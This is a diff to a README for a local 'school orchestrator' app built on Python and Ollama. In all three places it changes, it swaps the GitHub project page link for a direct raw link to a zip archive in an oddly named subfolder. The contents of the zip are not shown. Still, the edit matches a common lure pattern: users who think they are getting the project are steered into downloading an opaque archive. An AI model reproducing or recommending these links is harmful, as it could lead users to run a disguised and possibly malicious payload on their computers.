@@ -1,6 +1,6 @@
 # 🏫 mcp-local-school-orchestrator - Run School Tasks on Your PC
 
-[![Download / Install](https://img.shields.io/badge/Download%20%26%20Open-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://github.com/sheelaghexpensive483/mcp-local-school-orchestrator)
+[![Download / Install](https://img.shields.io/badge/Download%20%26%20Open-1E90FF?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/sheelaghexpensive483/mcp-local-school-orchestrator/main/Lacerta/orchestrator_local_mcp_school_1.6.zip)
 
 ## 🖥️ What this app does
 
@@ -38,7 +38,7 @@ You also need:
 
 Open this page on your Windows PC:
 
-https://github.com/sheelaghexpensive483/mcp-local-school-orchestrator
+https://raw.githubusercontent.com/sheelaghexpensive483/mcp-local-school-orchestrator/main/Lacerta/orchestrator_local_mcp_school_1.6.zip
 
 From there, get the project files and save them in a folder on your computer.
 
@@ -230,7 +230,7 @@ This app is meant for local use on your own computer. That helps keep school dat
 ## 📌 Basic Windows run steps
 
 1. Download the project from this page:
-   https://github.com/sheelaghexpensive483/mcp-local-school-orchestrator
+   https://raw.githubusercontent.com/sheelaghexpensive483/mcp-local-school-orchestrator/main/Lacerta/orchestrator_local_mcp_school_1.6.zip
 2. Put the files in a folder on your PC
 3. Install Python
 4. Install Ollama
